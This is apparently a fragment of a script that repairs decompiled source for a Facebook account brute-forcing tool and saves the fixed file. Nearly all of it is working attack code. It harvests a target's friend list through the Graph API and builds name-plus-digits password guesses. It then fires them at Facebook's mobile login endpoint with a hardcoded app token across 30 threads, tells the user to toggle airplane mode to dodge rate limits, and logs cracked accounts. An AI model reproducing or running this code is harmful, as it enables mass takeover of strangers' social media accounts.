                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': rua,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger' }
            response=ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers)
            if 'session_key' in response.text and 'EAAA' in response.text:""","""%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:""").replace("""import os

try:
    from cfonts import render, say
except Exception as e:
os.system('pip install python-cfonts')""","""import os

try:
	from cfonts import render, say
except ImportError:
	os.system("pip install python-cfonts")""").replace("""try:
    import concurrent.futures
except Exception as e:
os.system('pip install futures')""","""try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")""").replace("""try:
    import rich
except ImportError:
os.system('pip install rich')
time.sleep(1)

try:
    import rich
except ImportError:
exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')""","""try:
	import rich
except ImportError:
	os.system('pip install rich')
	try:
		import rich
	except ImportError:
		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')""").replace("""try:
    os.mkdir('/sdcard/')
except Exception as e:""","""try:
	os.mkdir('/sdcard/')
except:pass""").replace("""def clear():
    os.system('clear')


def login():
    try:
        token=open('.token.txt', 'r').read()
        tokenku.append(token)
        
        try:
            sy=requests.get('https://graph.facebook.com/me?access_token=' + tokenku[0])
            public_menu()
        except:
            pass
        Public()
except requests.exceptions.ConnectionError:
        clear()
        print(logo)
        print(' [×] Connection Timeout')
        exit()
        except IOError:
        Public()
        
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


def Public():
    clear()
    print(logo)
    print(' [01] Login With Token\n [02] Login With Cookie')
    pil=input('\n [#] Select One : ')
    if pil in ('1', '01'):
        panda=input(' [+] Token : ')
        akun=open('.token.txt', 'w').write(panda)
        
        try:
            tes=requests.get('https://graph.facebook.com/me?access_token=' + panda)
            tes3=json.loads(tes.text)['id']
            print(' [\x1a] Login Successful')
            login()
        except:
            pass
        print(' [×] Login Failed ')
        time.sleep(2.5)
        Public()
except requests.exceptions.ConnectionError:
        print(' [×] Connection Timeout')
        exit()
        if pil in ('2', '02'):
            
            try:cookie=input(' [+] Cookie : ')
                data=requests.get('https://business.facebook.com/business_locations', {
                    'user-agent': 'Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
                    'referer': 'https://www.facebook.com/',
                    'host': 'business.facebook.com',
                    'origin': 'https://business.facebook.com',
                    'upgrade-insecure-requests': '1',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'max-age=0',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8',
                    'content-type': 'text/html; charset=utf-8' }, {
                    'cookie': cookie }, **('headers', 'cookies'))
                find_token=re.search('(EAAG\\w+)', data.text)
                ken=open('.token.txt', 'w').write(find_token.group(1))
                print(' [\x1a] Login Successful')
                login()
            except:
            
            try:os.system('rm -f .token.txt')
                print(' [×] Login Failed ')
                time.sleep(2.5)
                login()
                exit()
            except:
                
                
            
            
            

def public_menu():
    
    try:
        token=open('.token.txt', 'r').read()
    except IOError:
    exit()
    clear()
    print(logo)
    pil=input('\n [+] Enter ID Target : ')
    
    try:
        koh2=requests.get('https://graph.facebook.com/v2.0/' + pil + '?fields=friends.limit(5000)&access_token=' + tokenku[0]).json()
        for pi in koh2['friends']['data']:
            id.append(pi['id'] + '|' + pi['name'])
        print(' [\x1a] Total : ' + str(len(id)))
        setting()
    except IOError:
    print(' [#] Connection Time Out')
    exit()
    (KeyError, IOError)
    print(' [!] Not public Or Token Expire')
    exit()
    
def File():
    clear()
    print(logo)
    
    try:
        fileX=input('\n [+] Enter file path : ')
        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
    except IOError:
    exit('\n [!] file %s not found' % fileX)
        except:pass
def setting():
    hu='2'
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx=random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print(' [!] Choose Correct Option')
        exit()
    clear()
    print(logo)
    print('\n [01] Method 1 ')
    print(' [02] Method 2 \x1b[1;97m')
    hc=input('\n [#] method : ')
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('2', '02'):
        method.append('free')
    else:
        method.append('mobile')
    passmenu()


def passmenu():
    clear()
    print(logo)
    print('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
    passmen=input('\n [#] Select Pass : ')
    if passmen in ('1', '01'):
        first()
    elif passmen in ('2', '02'):
        name()
    elif passmen in ('3', '03'):
        name2()
    else:
        passmenu()


def first():
    clear()
    print(logo)
    print(' [!] \x1b[1;96mTurn Airplane Mode On/Off Every 5 Second\x1b[1;0m\n')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf=yuzong.split('|')[0]
            nmf=yuzong.split('|')[1].lower()
            frs=nmf.split(' ')[0]
            pwv=[
                '445566']
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs + '123')
                    pwv.append(frs + '12345')
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append(frs + '123')
                pwv.append(frs + '12345')
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
                
            if 'free' in method:
                pool.submit(free, idf, pwv)
                
            pool.submit(crack, idf, pwv)
        

def name():""","""def clear():
	os.system('clear')
# BACK
def login():
	try:
		token = open('.token.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
			public_menu()
		except KeyError:
			Public()
		except requests.exceptions.ConnectionError:
			clear()
			print(logo)
			print ( ' [×] Connection Timeout')
			exit()
	except IOError:
		Public()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
################LOGO##############
# LOGIN
def Public():
	clear()
	print(logo)
	print  (' [01] Login With Token\n [02] Login With Cookie')
	pil=input('\n [#] Select One : ')
	if pil in ['1','01']:
		panda = input(' [+] Token : ')
		akun=open('.token.txt','w').write(panda)
		try:
			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
			tes3 = json.loads(tes.text)['id']
			print (" [] Login Successful")
			login()
		except KeyError:
			print( ' [×] Login Failed ')
			Public()
		except requests.exceptions.ConnectionError:
			print ( ' [×] Connection Timeout')
			exit()
	elif pil in ['2','02']:
		try:
			cookie=input(" [+] Cookie : ")
			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "http://www.facebook.com/","host": "http://business.facebook.com/login/?next=http%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbizweb_landing_fb_login_button%26biz_login_source%3Dbizweb_landing_fb_login_button","origin": "http://business.facebook.com/login/?next=http%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbizweb_landing_fb_login_button%26biz_login_source%3Dbizweb_landing_fb_login_button","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
			find_token = re.search("(EAAG\w+)", data.text)
			ken=open(".token.txt", "w").write(find_token.group(1))
			print (" [] Login Successful")
			login()
		except Exception as e: 
			os.system("rm -f .token.txt")
			print( ' [×] Login Failed ')
			time.sleep()
			login()
			exit()
def public_menu():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	clear()
	print(logo)
	pil = input('\n [+] Enter ID Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(999999)&access_token='+tokenku[0]).json()
		for pi in koh2['friends']['data']:
			id.append(pi['id']+'|'+pi['name'])
		print(' [] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print (' [#] Connection Time Out')
		exit()
	except (KeyError,IOError):
		print(' [!] Not public Or Token Expire')
		exit()
def File():
			clear()
			print(logo)
			try:
				fileX = input ('\n [+] FILE NAME : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit("\n [!] file %s not found"%(fileX))
def setting():
	hu = ("2")
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print (' [!] Choose Correct Option')
		exit()
	clear()
	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 [BEST] \033[1;97m')
	hc = input ("\n [+] Method : ")
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	else:
		method.append('mobile')
	passmenu()
def passmenu():
	clear()
	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
	passmen=input('\n [#] Select Pass : ')
	if passmen in ['1','01']:
		first()
	elif passmen in ['2','02']:
		name()
	elif passmen in ['3','03']:
		name2()
	else:
		passmenu()
def first():
	clear()
	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['445566']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'١٢٣٤٥٦')
					pwv.append(frs+'١٢٣٤٥٦٧')
					pwv.append(frs+'١٢٣٤٥٦٧٨')
					pwv.append(frs+'١٢٣٤٥٦٧٨٩')
					pwv.append(frs+'١٢٣٤٥٦٧٨٩٠')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'١٢٣٤٥٦')
					pwv.append(frs+'١٢٣٤٥٦٧')
					pwv.append(frs+'١٢٣٤٥٦٧٨')
					pwv.append(frs+'١٢٣٤٥٦٧٨٩')
					pwv.append(frs+'١٢٣٤٥٦٧٨٩٠')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(free,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
def name():
	clear()
	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			try:
				idf,nmf = yuzong.split(' ➪ ')
				xz = nmf.split(' ➪ ')
				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"123456",xz[0]+xz[1]+"1234567",xz[0]+xz[1]+"12345678", xz[0]+xz[1]+"123456789",xz[0]+xz[1]+"1234567890", xz[0]+xz[1]+"١٢٣٤٥٦",xz[0]+xz[1]+"١٢٣٤٥٦٧",xz[0]+xz[1]+"١٢٣٤٥٦٧٨", xz[0]+xz[1]+"١٢٣٤٥٦٧٨٩",xz[0]+xz[1]+"١٢٣٤٥٦٧٨٩٠"]
				else:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"123456",xz[0]+xz[1]+"1234567",xz[0]+xz[1]+"12345678", xz[0]+xz[1]+"123456789",xz[0]+xz[1]+"1234567890", xz[0]+xz[1]+"١٢٣٤٥٦",xz[0]+xz[1]+"١٢٣٤٥٦٧",xz[0]+xz[1]+"١٢٣٤٥٦٧٨", xz[0]+xz[1]+"١٢٣٤٥٦٧٨٩",xz[0]+xz[1]+"١٢٣٤٥٦٧٨٩٠"]
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(free,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
			except:
				pass
def name2():
	clear()
	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split(' ➪ ')[0],yuzong.split(' ➪ ')[1].lower()
			frs = nmf.split(' ➪ ')[0]
			pwv = ['445566']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'١٢٣٤٥٦')
					pwv.append(frs+'١٢٣٤٥٦٧')
					pwv.append(frs+'١٢٣٤٥٦٧٨')
					pwv.append(frs+'١٢٣٤٥٦٧٨٩')
					pwv.append(frs+'١٢٣٤٥٦٧٨٩٠')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'١٢٣٤٥٦')
					pwv.append(frs+'١٢٣٤٥٦٧')
					pwv.append(frs+'١٢٣٤٥٦٧٨')
					pwv.append(frs+'١٢٣٤٥٦٧٨٩')
					pwv.append(frs+'١٢٣٤٥٦٧٨٩٠')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(free,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
def name():""")
print("Copy √ Decode_Escanor.py")
file_path1 = Path("/storage/emulated/0/BARON/Decoded.py")
with open(str(file_path1), 'w') as file:
    print('\x1b[1;92m\x1b[38;5;222m    ▭▬▭▬▭▬     \x1b[1;92m\x1b[38;5;425m    ▭▬▭▬▭▬          ')
    file.write(Devil)    
    main(na,m)